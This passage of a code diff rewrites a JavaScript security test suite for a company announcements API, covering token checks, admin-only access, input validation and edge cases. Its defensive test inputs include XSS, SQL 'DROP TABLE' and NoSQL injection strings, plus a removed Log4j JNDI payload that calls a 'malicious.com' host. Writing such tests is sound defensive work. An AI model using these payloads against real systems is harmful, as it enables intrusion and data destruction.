-          expect(response.body.error).toBe('Access token required');
-        }
-      });
-
-      test('[TC-SEC-001-2] should reject malformed Bearer tokens', async () => {
-        const malformedTokens = [
-          'Bearer',
-          'Bearer ',
-          'bearer valid_token',
-          'Basic dGVzdDp0ZXN0',
-          'Invalid format'
-        ];
-
-        for (const token of malformedTokens) {
-          const response = await request(app)
-            .get('/api/announcements')
-            .set('Authorization', token);
-
-          expect([401, 403]).toContain(response.status);
-        }
-      });
-
-      test('[TC-SEC-001-3] should reject expired or invalid JWT tokens', async () => {
-        const invalidTokens = [
-          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
-          'expired_token_here',
-          'tampered_token_content'
-        ];
-
-        for (const token of invalidTokens) {
-          const response = await request(app)
-            .get('/api/announcements')
-            .set('Authorization', `Bearer ${token}`);
-
-          expect(response.status).toBe(403);
-          expect(response.body.error).toBe('Invalid or expired token');
-        }
-      });
-
-      test('[TC-SEC-001-4] should prevent token reuse after user deletion', async () => {
-        // Create temporary user
-        const tempUser = await User.create({
-          username: 'temp_user',
-          email: 'temp@test.com',
-          password: 'password123',
-          role: 'employee'
-        });
-
-        // Generate token for temp user
-        const loginResponse = await request(app)
-          .post('/api/auth/login')
-          .send({ email: 'temp@test.com', password: 'password123' });
-        const tempToken = loginResponse.body.token;
-
-        // Verify token works initially
-        const validResponse = await request(app)
-          .get('/api/announcements')
-          .set('Authorization', `Bearer ${tempToken}`);
-        expect(validResponse.status).toBe(200);
-
-        // Delete user
-        await User.deleteOne({ _id: tempUser._id });
-
-        // Token should now be invalid
-        const invalidResponse = await request(app)
-          .get('/api/announcements')
-          .set('Authorization', `Bearer ${tempToken}`);
-        expect(invalidResponse.status).toBe(403);
-      });
+      expect(response.status).toBe(401);
+      expect(response.body.error).toBe('Access token required');
     });
 
-    describe('Authorization Security', () => {
-      test('[TC-SEC-001-5] should enforce role-based access control for admin endpoints', async () => {
-        const adminEndpoints = [
-          { method: 'get', path: '/api/announcements/admin' },
-          { method: 'post', path: '/api/announcements', data: { title: 'Test', content: 'Test' } }
-        ];
+    test('should reject requests with invalid token', async () => {
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', 'Bearer invalid_token_here');
 
-        const nonAdminTokens = [employeeToken, managerToken];
+      expect(response.status).toBe(403);
+      expect(response.body.error).toBe('Invalid or expired token');
+    });
 
-        for (const endpoint of adminEndpoints) {
-          for (const token of nonAdminTokens) {
-            const request_obj = request(app)[endpoint.method](endpoint.path)
-              .set('Authorization', `Bearer ${token}`);
-            
-            if (endpoint.data) {
-              request_obj.send(endpoint.data);
-            }
+    test('should reject malformed authorization headers', async () => {
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', 'InvalidFormat token_here');
 
-            const response = await request_obj;
-            expect(response.status).toBe(403);
-            expect(response.body.message || response.body.error).toContain('Admin privileges required');
-          }
-        }
-      });
+      expect(response.status).toBe(401);
+      expect(response.body.error).toContain('Invalid authorization format');
+    });
 
-      test('[TC-SEC-001-6] should prevent privilege escalation attempts', async () => {
-        // Attempt to modify user role through announcement creation
+    test('should reject expired tokens', async () => {
+      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MWY3YjE0NzM1ZjMwNTAwMTYyMzQ1NjciLCJpYXQiOjE2NDM2NDM1NTksImV4cCI6MTY0MzY0NzE1OX0.expired';
+      
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${expiredToken}`);
+
+      expect(response.status).toBe(403);
+      expect(response.body.error).toBe('Invalid or expired token');
+    });
+
+    test('should handle missing Bearer prefix in authorization', async () => {
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', adminToken);
+
+      expect(response.status).toBe(401);
+      expect(response.body.error).toContain('Invalid authorization format');
+    });
+
+    test('should prevent token tampering attacks', async () => {
+      const tamperedToken = adminToken.slice(0, -10) + 'tampered123';
+      
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${tamperedToken}`);
+
+      expect(response.status).toBe(403);
+      expect(response.body.error).toBe('Invalid or expired token');
+    });
+  });
+
+  describe('[TC-SECURITY-002] Authorization Security Tests', () => {
+    test('should enforce admin-only access for announcement creation', async () => {
+      const nonAdminTokens = [employeeToken, managerToken];
+      
+      for (const token of nonAdminTokens) {
         const response = await request(app)
           .post('/api/announcements')
-          .set('Authorization', `Bearer ${employeeToken}`)
+          .set('Authorization', `Bearer ${token}`)
           .send({
-            title: 'Test',
-            content: 'Test',
-            createdBy: adminUser._id,
-            role: 'admin'
+            title: 'Unauthorized Announcement',
+            content: 'This should not be allowed'
           });
 
         expect(response.status).toBe(403);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toBe('Access denied. Admin privileges required.');
+      }
+    });
+
+    test('should enforce admin-only access for announcement updates', async () => {
+      // Create test announcement first
+      testAnnouncement = await Announcement.create({
+        title: 'Test Announcement',
+        content: 'Test content',
+        createdBy: adminUser._id,
+        isActive: true
       });
 
-      test('[TC-SEC-001-7] should prevent cross-user data access', async () => {
-        // Create announcement as admin
-        const announcement = await Announcement.create({
-          title: 'Admin Only',
-          content: 'Secret content',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
-        // Employee should not be able to modify admin's announcement
+      const nonAdminTokens = [employeeToken, managerToken];
+      
+      for (const token of nonAdminTokens) {
         const response = await request(app)
-          .put(`/api/announcements/${announcement._id}`)
-          .set('Authorization', `Bearer ${employeeToken}`)
-          .send({ title: 'Hacked' });
+          .put(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${token}`)
+          .send({
+            title: 'Updated Title',
+            content: 'Updated content'
+          });
 
         expect(response.status).toBe(403);
-      });
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toBe('Access denied. Admin privileges required.');
+      }
     });
 
-    describe('Input Validation Security', () => {
-      test('[TC-SEC-001-8] should sanitize and validate announcement content', async () => {
-        const maliciousInputs = [
-          {
-            title: '<script>alert("XSS")</script>',
-            content: 'Normal content',
-            expectedStatus: 400
-          },
-          {
-            title: 'Normal title',
-            content: '<img src=x onerror=alert("XSS")>',
-            expectedStatus: 400
-          },
-          {
-            title: '${jndi:ldap://malicious.com/a}',
-            content: 'Log4j injection attempt',
-            expectedStatus: 400
-          },
-          {
-            title: "'; DROP TABLE announcements; --",
-            content: 'SQL injection attempt',
-            expectedStatus: 400
-          }
-        ];
-
-        for (const input of maliciousInputs) {
-          const response = await request(app)
-            .post('/api/announcements')
-            .set('Authorization', `Bearer ${adminToken}`)
-            .send(input);
-
-          expect(response.status).toBe(input.expectedStatus);
-          if (response.status === 400) {
-            expect(response.body.message).toContain('Invalid content format');
-          }
-        }
+    test('should enforce admin-only access for announcement deletion', async () => {
+      // Create test announcement first
+      testAnnouncement = await Announcement.create({
+        title: 'Test Announcement',
+        content: 'Test content',
+        createdBy: adminUser._id,
+        isActive: true
       });
 
-      test('[TC-SEC-001-9] should prevent NoSQL injection in queries', async () => {
-        const maliciousQueries = [
-          { id: '{"$ne": null}' },
-          { id: '{"$regex": ".*"}' },
-          { id: '{"$where": "this.title.length > 0"}' }
-        ];
-
-        for (const query of maliciousQueries) {
-          const response = await request(app)
-            .get(`/api/announcements/${query.id}`)
-            .set('Authorization', `Bearer ${adminToken}`);
-
-          expect([400, 404]).toContain(response.status);
-        }
-      });
-
-      test('[TC-SEC-001-10] should validate request size limits', async () => {
-        const oversizedPayload = {
-          title: 'A'.repeat(10000),
-          content: 'B'.repeat(100000)
-        };
-
+      const nonAdminTokens = [employeeToken, managerToken];
+      
+      for (const token of nonAdminTokens) {
         const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send(oversizedPayload);
+          .delete(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${token}`);
 
-        expect([400, 413]).toContain(response.status);
-      });
-
-      test('[TC-SEC-001-11] should validate ObjectId format in parameters', async () => {
-        const invalidIds = ['invalid', '123', 'not-an-objectid', ''];
-
-        for (const id of invalidIds) {
-          const response = await request(app)
-            .get(`/api/announcements/${id}`)
-            .set('Authorization', `Bearer ${adminToken}`);
-
-          expect(response.status).toBe(400);
-          expect(response.body.message).toContain('Invalid ID format');
-        }
-      });
+        expect(response.status).toBe(403);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toBe('Access denied. Admin privileges required.');
+      }
     });
 
-    describe('Rate Limiting and DoS Protection', () => {
-      test('[TC-SEC-001-12] should implement rate limiting for announcement creation', async () => {
-        const requests = Array.from({ length: 20 }, (_, i) =>
-          request(app)
-            .post('/api/announcements')
-            .set('Authorization', `Bearer ${adminToken}`)
-            .send({
-              title: `Spam announcement ${i}`,
-              content: `Spam content ${i}`
-            })
-        );
-
-        const responses = await Promise.all(requests);
-        const rateLimitedResponses = responses.filter(r => r.status === 429);
-        
-        // Should have some rate limited responses
-        expect(rateLimitedResponses.length).toBeGreaterThan(0);
+    test('should allow all authenticated users to read announcements', async () => {
+      // Create test announcement
+      await Announcement.create({
+        title: 'Public Announcement',
+        content: 'This should be visible to all',
+        createdBy: adminUser._id,
+        isActive: true
       });
 
-      test('[TC-SEC-001-13] should handle concurrent unauthorized access attempts', async () => {
-        const maliciousRequests = Array.from({ length: 10 }, () =>
-          request(app)
-            .post('/api/announcements')
-            .set('Authorization', 'Bearer fake_token')
-            .send({ title: 'Attack', content: 'Attack' })
-        );
-
-        const responses = await Promise.all(maliciousRequests);
-        
-        // All should be unauthorized
-        responses.forEach(response => {
-          expect(response.status).toBe(403);
-        });
-      });
-    });
-
-    describe('Data Integrity and Security', () => {
-      test('[TC-SEC-001-14] should prevent announcement tampering', async () => {
-        const announcement = await Announcement.create({
-          title: 'Original',
-          content: 'Original content',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
-        // Attempt to tamper with system fields
+      const allTokens = [adminToken, employeeToken, managerToken];
+      
+      for (const token of allTokens) {
         const response = await request(app)
-          .put(`/api/announcements/${announcement._id}`)
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({
-            title: 'Updated',
-            content: 'Updated content',
-            createdBy: employeeUser._id, // Should not be modifiable
-            created_at: new Date('2020-01-01'), // Should not be modifiable
-            _id: 'different_id' // Should not be modifiable
-          });
+          .get('/api/announcements')
+          .set('Authorization', `Bearer ${token}`);
 
         expect(response.status).toBe(200);
-        
-        // Verify system fields weren't tampered with
-        const updatedAnnouncement = await Announcement.findById(announcement._id);
-        expect(updatedAnnouncement.createdBy.toString()).toBe(adminUser._id.toString());
-        expect(updatedAnnouncement._id.toString()).toBe(announcement._id.toString());
-      });
-
-      test('[TC-SEC-001-15] should audit security events', async () => {
-        // Attempt unauthorized access
-        await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${employeeToken}`)
-          .send({ title: 'Unauthorized', content: 'Test' });
-
-        // Security events should be logged (implementation dependent)
-        // This test verifies the endpoint properly handles and logs security violations
-        expect(true).toBe(true); // Placeholder for audit log verification
-      });
+        expect(response.body).toHaveLength(1);
+        expect(response.body[0].title).toBe('Public Announcement');
+      }
     });
 
-    describe('Session and Token Security', () => {
-      test('[TC-SEC-001-16] should handle token expiry gracefully', async () => {
-        // This would require a short-lived test token
-        // For now, we test the error handling path
-        const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
-        
+    test('should prevent privilege escalation attempts', async () => {
+      // Attempt to modify user role through announcement creation
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`)
+        .send({
+          title: 'Test',
+          content: 'Test',
+          createdBy: adminUser._id, // Attempt to impersonate admin
+          role: 'admin' // Attempt to escalate privileges
+        });
+
+      expect(response.status).toBe(403);
+      expect(response.body.message).toBe('Access denied. Admin privileges required.');
+    });
+  });
+
+  describe('[TC-SECURITY-003] Input Validation Security Tests', () => {
+    test('should prevent SQL injection attempts in title', async () => {
+      const maliciousTitle = "'; DROP TABLE announcements; --";
+      
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: maliciousTitle,
+          content: 'Test content'
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.success).toBe(false);
+      expect(response.body.message).toContain('Invalid content format');
+    });
+
+    test('should prevent XSS attacks in content', async () => {
+      const xssPayload = '<script>alert("XSS")</script>';
+      
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: 'Test Title',
+          content: xssPayload
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.success).toBe(false);
+      expect(response.body.message).toContain('Invalid content format');
+    });
+
+    test('should prevent NoSQL injection in MongoDB queries', async () => {
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`)
+        .query({ id: { $ne: null } });
+
+      expect(response.status).toBe(200);
+      // Should still work normally, not expose all records
+    });
+
+    test('should validate announcement ID format for MongoDB ObjectId', async () => {
+      const invalidIds = ['invalid_id', '123', 'not_an_objectid', ''];
+      
+      for (const invalidId of invalidIds) {
         const response = await request(app)
-          .get('/api/announcements')
-          .set('Authorization', `Bearer ${expiredToken}`);
+          .get(`/api/announcements/${invalidId}`)
+          .set('Authorization', `Bearer ${adminToken}`);
 
-        expect(response.status).toBe(403);
-        expect(response.body.error).toBe('Invalid or expired token');
+        expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Invalid ID format');
+      }
+    });
+
+    test('should enforce maximum title length', async () => {
+      const longTitle = 'A'.repeat(201); // Assuming max length is 200
+      
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: longTitle,
+          content: 'Valid content'
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.success).toBe(false);
+      expect(response.body.message).toContain('Validation errors');
+    });
+
+    test('should enforce maximum content length', async () => {
+      const longContent = 'A'.repeat(5001); // Assuming max length is 5000
+      
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: 'Valid title',
+          content: longContent
+        });
+
+      expect(response.status).toBe(400);
+      expect(response.body.success).toBe(false);
+      expect(response.body.message).toContain('Validation errors');
+    });
+
+    test('should sanitize HTML entities in input', async () => {
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: 'Title with &lt;script&gt; tags',
+          content: 'Content with &amp; entities'
+        });
+
+      expect(response.status).toBe(201);
+      expect(response.body.data.title).toBe('Title with &lt;script&gt; tags');
+      expect(response.body.data.content).toBe('Content with &amp; entities');
+    });
+  });
+
+  describe('[TC-EDGE-001] Edge Case and Error Handling Tests', () => {
+    test('should handle database connection failures gracefully', async () => {
+      // Mock database connection failure
+      const originalFind = Announcement.find;
+      Announcement.find = jest.fn().mockRejectedValue(new Error('Database connection failed'));
+
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`);
+
+      expect(response.status).toBe(500);
+      expect(response.body.error).toContain('Failed to fetch announcements');
+
+      // Restore original method
+      Announcement.find = originalFind;
+    });
+
+    test('should handle concurrent announcement creation', async () => {
+      const announcementPromises = Array.from({ length: 5 }, (_, i) =>
+        request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({
+            title: `Concurrent Announcement ${i + 1}`,
+            content: `Content ${i + 1}`
+          })
+      );
+
+      const responses = await Promise.all(announcementPromises);
+
+      responses.forEach(response => {
+        expect(response.status).toBe(201);
+        expect(response.body.success).toBe(true);
       });
 
-      test('[TC-SEC-001-17] should prevent session fixation', async () => {
-        // Generate fresh token
-        const loginResponse1 = await request(app)
-          .post('/api/auth/login')
-          .send({ email: 'admin@test.com', password: 'password123' });
-        
-        // Generate another token for same user
-        const loginResponse2 = await request(app)
-          .post('/api/auth/login')
-          .send({ email: 'admin@test.com', password: 'password123' });
+      // Verify all announcements were created
+      const allAnnouncements = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`);
 
-        // Both tokens should be valid and different
-        expect(loginResponse1.body.token).not.toBe(loginResponse2.body.token);
-        
-        const response1 = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${loginResponse1.body.token}`);
-        
-        const response2 = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${loginResponse2.body.token}`);
+      expect(allAnnouncements.body).toHaveLength(5);
+    });
 
-        expect(response1.status).toBe(200);
-        expect(response2.status).toBe(200);
+    test('should handle extremely large request payloads', async () => {
+      const largePayload = {
+        title: 'Large Payload Test',
+        content: 'A'.repeat(10000), // Very large content
+        extraField: 'B'.repeat(10000) // Additional large field
+      };
+
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send(largePayload);
+
+      expect(response.status).toBe(413); // Payload too large
+    });
+
+    test('should handle malformed JSON requests', async () => {
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .set('Content-Type', 'application/json')
+        .send('{"title": "Test", "content": "Test"'); // Malformed JSON
+
+      expect(response.status).toBe(400);
+      expect(response.body.error).toContain('Invalid JSON');
+    });
+
+    test('should handle missing content-type header', async () => {
+      const response = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send('title=Test&content=Test'); // Form data instead of JSON
+
+      expect(response.status).toBe(400);
+      expect(response.body.error).toContain('Content-Type must be application/json');
+    });
+
+    test('should handle race conditions in announcement updates', async () => {
+      // Create test announcement
+      testAnnouncement = await Announcement.create({
+        title: 'Race Condition Test',
+        content: 'Original content',
+        createdBy: adminUser._id,
+        isActive: true
       });
+
+      // Simulate concurrent updates
+      const updatePromises = Array.from({ length: 3 }, (_, i) =>
+        request(app)
+          .put(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({
+            title: `Updated Title ${i + 1}`,
+            content: `Updated content ${i + 1}`
+          })
+      );
+
+      const responses = await Promise.all(updatePromises);
+
+      // At least one should succeed
+      const successfulResponses = responses.filter(r => r.status === 200);
+      expect(successfulResponses.length).toBeGreaterThan(0);
+    });
+
+    test('should handle server memory pressure during large operations', async () => {
+      // Create many announcements to test memory handling
+      const announcements = Array.from({ length: 1000 }, (_, i) => ({
+        title: `Memory Test Announcement ${i + 1}`,
+        content: `Content for announcement ${i + 1} with additional text to increase memory usage`,
+        createdBy: adminUser._id,
+        isActive: true
+      }));
+
+      await Announcement.insertMany(announcements);
+
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`);
+
+      expect(response.status).toBe(200);
+      expect(response.body.length).toBe(1000);
+    });
+
+    test('should handle network timeout scenarios', async () => {
+      // Mock slow database operation
+      const originalFind = Announcement.find;
+      Announcement.find = jest.fn().mockImplementation(() => ({
+        populate: jest.fn().mockReturnValue({
+          sort: jest.fn().mockImplementation(() => 
+            new Promise(resolve => setTimeout(resolve, 30000)) // 30 second delay
+          )
+        })
+      }));
+
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`)
+        .timeout(5000); // 5 second timeout
+
+      expect(response.status).toBe(408); // Request timeout
+      
+      // Restore original method
+      Announcement.find = originalFind;
+    });
+
+    test('should handle invalid ObjectId references', async () => {
+      const response = await request(app)
+        .put('/api/announcements/507f1f77bcf86cd799439011') // Valid ObjectId format but non-existent
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: 'Updated Title',
+          content: 'Updated content'
+        });
+
+      expect(response.status).toBe(404);
+      expect(response.body.success).toBe(false);
+      expect(response.body.message).toContain('not found');
+    });
+
+    test('should handle server restart scenarios', async () => {
+      // Create announcement
+      const createResponse = await request(app)
+        .post('/api/announcements')
+        .set('Authorization', `Bearer ${adminToken}`)
+        .send({
+          title: 'Pre-restart Announcement',
+          content: 'This should persist after restart'
+        });
+
+      expect(createResponse.status).toBe(201);
+      const announcementId = createResponse.body.data._id;
+
+      // Simulate server restart by clearing any in-memory cache
+      // (In real scenario, this would involve actually restarting the server)
+      
+      // Verify announcement still exists after "restart"
+      const response = await request(app)
+        .get('/api/announcements')
+        .set('Authorization', `Bearer ${employeeToken}`);
+
+      expect(response.status).toBe(200);
+      expect(response.body.some(ann => ann._id === announcementId)).toBe(true);
     });
   });
 
@@ -1421,102 +1546,4 @@ describe('Company Announcements System Integration Tests', () => {
       expect(response.status).toBe(201);
       expect(response.body.success).toBe(true);
       expect(response.body.data.title).toBe(validData.title);
-      expect(response.body.data.content).toBe(validData.content);
-    });
-  });
-
-  describe('[TC-AN-009] Performance and Pagination Tests', () => {
-    test('[TC-AN-009-HP] should handle large number of announcements efficiently', async () => {
-      // Create multiple announcements
-      const announcements = Array.from({ length: 50 }, (_, i) => ({
-        title: `Announcement ${i + 1}`,
-        content: `Content for announcement ${i + 1}`,
-        createdBy: adminUser._id,
-        isActive: true
-      }));
-
-      await Announcement.insertMany(announcements);
-
-      const startTime = Date.now();
-      const response = await request(app)
-        .get('/api/announcements')
-        .set('Authorization', `Bearer ${employeeToken}`);
-      const endTime = Date.now();
-
-      expect(response.status).toBe(200);
-      expect(response.body.length).toBe(50);
-      expect(endTime - startTime).toBeLessThan(1000); // Should respond within 1 second
-    });
-
-    test('[TC-AN-009-EP] should handle pagination parameters correctly', async () => {
-      // Create test announcements
-      await Announcement.insertMany([
-        { title: 'Ann 1', content: 'Content 1', createdBy: adminUser._id, isActive: true },
-        { title: 'Ann 2', content: 'Content 2', createdBy: adminUser._id, isActive: true },
-        { title: 'Ann 3', content: 'Content 3', createdBy: adminUser._id, isActive: true }
-      ]);
-
-      const response = await request(app)
-        .get('/api/announcements?page=1&limit=2')
-        .set('Authorization', `Bearer ${employeeToken}`);
-
-      expect(response.status).toBe(200);
-      expect(response.body.length).toBeLessThanOrEqual(2);
-    });
-  });
-
-  describe('[TC-AN-010] Real-time Updates and Notifications', () => {
-    test('[TC-AN-010-HP] should immediately reflect new announcements to all users', async () => {
-      // Create announcement
-      const createResponse = await request(app)
-        .post('/api/announcements')
-        .set('Authorization', `Bearer ${adminToken}`)
-        .send({
-          title: 'Breaking News',
-          content: 'Important update for all staff'
-        });
-
-      expect(createResponse.status).toBe(201);
-
-      // Verify immediate visibility across different user types
-      const [employeeView, managerView] = await Promise.all([
-        request(app).get('/api/announcements').set('Authorization', `Bearer ${employeeToken}`),
-        request(app).get('/api/announcements').set('Authorization', `Bearer ${managerToken}`)
-      ]);
-
-      expect(employeeView.status).toBe(200);
-      expect(employeeView.body).toHaveLength(1);
-      expect(employeeView.body[0].title).toBe('Breaking News');
-
-      expect(managerView.status).toBe(200);
-      expect(managerView.body).toHaveLength(1);
-      expect(managerView.body[0].title).toBe('Breaking News');
-    });
-
-    test('[TC-AN-010-EP] should handle concurrent announcement creation attempts', async () => {
-      const announcementPromises = Array.from({ length: 3 }, (_, i) =>
-        request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({
-            title: `Concurrent Announcement ${i + 1}`,
-            content: `Content ${i + 1}`
-          })
-      );
-
-      const responses = await Promise.all(announcementPromises);
-
-      responses.forEach(response => {
-        expect(response.status).toBe(201);
-        expect(response.body.success).toBe(true);
-      });
-
-      // Verify all announcements are created
-      const allAnnouncements = await request(app)
-        .get('/api/announcements')
-        .set('Authorization', `Bearer ${employeeToken}`);
-
-      expect(allAnnouncements.body).toHaveLength(3);
-    });
-  });
-});
+      expect(response.body.data.content).
